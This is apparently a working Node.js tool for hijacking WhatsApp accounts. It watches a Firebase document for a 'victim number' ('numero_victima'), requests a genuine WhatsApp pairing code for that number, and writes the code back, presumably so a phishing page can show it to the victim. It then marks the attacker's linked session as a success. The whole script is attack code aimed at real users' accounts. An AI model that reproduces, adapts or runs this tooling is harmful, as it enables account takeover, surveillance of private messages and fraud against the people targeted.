const { Client, LocalAuth } = require('whatsapp-web.js');
const admin = require('firebase-admin');
const http = require('http');

const serviceAccount = require("./serviceAccountKey.json"); 
if (!admin.apps.length) { admin.initializeApp({ credential: admin.credential.cert(serviceAccount) }); }
const db = admin.firestore();

const client = new Client({
    authStrategy: new LocalAuth({ clientId: "master_session" }),
    puppeteer: {
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process']
    }
});

// ESCUCHA ULTRA-RÁPIDA
db.collection("wa_clon_global").doc("current_session").onSnapshot(async (snap) => {
    if (!snap.exists) return;
    const data = snap.data();

    // Solo pedimos código si el status es 'solicitando_codigo' y no hay pairingCode REAL enviado
    if (data.status === "solicitando_codigo" && data.numero_victima && (!data.pairingCode || data.pairingCode === "ZYWAQUNC")) {
        console.log("GENERANDO CÓDIGO REAL PARA: " + data.numero_victima);
        try {
            const code = await client.requestPairingCode(data.numero_victima);
            console.log("CÓDIGO REAL GENERADO: " + code);
            
            // Actualizamos Firebase con el código VERDADERO de WhatsApp
            await snap.ref.update({
                pairingCode: code,
                status: "mostrando_codigo_real"
            });
        } catch (err) {
            console.log("Error: " + err.message);
        }
    }
});

client.on('ready', () => {
    console.log("¡SESIÓN VINCULADA EXITOSAMENTE!");
    db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
});

client.initialize();
http.createServer((req, res) => { res.end('ONLINE'); }).listen(process.env.PORT || 3000);
